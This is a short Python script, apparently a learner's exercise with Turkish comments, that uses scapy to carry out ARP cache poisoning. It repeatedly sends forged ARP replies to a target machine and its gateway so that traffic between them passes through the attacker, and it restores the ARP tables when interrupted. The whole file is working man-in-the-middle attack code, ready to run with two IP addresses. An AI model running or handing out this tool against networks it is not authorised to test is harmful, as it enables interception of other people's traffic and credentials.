import scapy.all as scapy
import time
import optparse

def get_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t","--target_ip",dest="target_ip",help="Target ip adress")
    parse_object.add_option("-m","--modem_ip",dest="modem_ip",help="Modem ip adress")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter target ip please")
    if not options.modem_ip:
        print("Enter modem ip please")

    return options


def get_mac_adress(ip):
    arp_request_pack = scapy.ARP(pdst = ip)  #bu sorguyu alttaki adrese gönderecez 256 tane var. bu ıp kimde var diye soruyor
    #scapy.ls(scapy.ARP())  içine verebileceğin inputları gösteriyor
    #"10.0.2.1/24" bunlar arasından bakıyor

    broadcast_pack = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")    #gidilecek olan mac adresi destination modeme yani default tur.
    #scapy.ls(scapy.Ether())                                    #ls komutu gibi orada neler olduğunu gösteriyor, src de biziz gönderen

    combine_pack = broadcast_pack / arp_request_pack  #ikisini kombine ettik çünkü ikisini de kullanıcaz

    answer_list = scapy.srp(combine_pack,timeout=1,verbose = False)[0]
    #içindeki paketi gönderecek cevap verilen verilmeyenleri yazacak timeout cevap yoksa cevap vermesini beklemicek
    #srp bunu yolluyor
    #tuple şeklinde iki tane liste bastırıyor

    return answer_list[0][1].hwsrc


def arp_poison(target_ip,modem_ip):

    target_mac = get_mac_adress(target_ip)

    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=modem_ip)  #modemıp 10.0.2.1
    #scapy.ls(scapy.ARP())
    #hwdst harware destination hedef mac
    #psrc source yi modem gibi gösterecez onun ıp adresini yazacaz
    #pdst targer ıp yi windowsda targette gösterecez onun ıpsi
    # bu mac adresinden gelen requestli kişinini ı

    scapy.send(arp_response,verbose = False)

def reset(target_ip,modem_ip):

    target_mac = get_mac_adress(target_ip)
    modem_mac = get_mac_adress(modem_ip)

    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=modem_ip,hwsrc=modem_mac)

    scapy.send(arp_response,verbose = False,count=5)

got_ips = get_input()
got_target_ip = got_ips.target_ip
got_modem_ip = got_ips.modem_ip

repeat=0
try:
    while True:
        arp_poison(got_target_ip,got_modem_ip) #windowsda kendini modem gibi göster
        arp_poison(got_modem_ip,got_target_ip)  #modem de kendini karşı windows gibi göster
        repeat+=2
        print("\rSending packets ",str(repeat),end="")

        time.sleep(3)

except KeyboardInterrupt:
    print("\nquit and reset")
    reset(got_target_ip,got_modem_ip)
    reset(got_modem_ip,got_target_ip)


print("Total sending:",repeat)
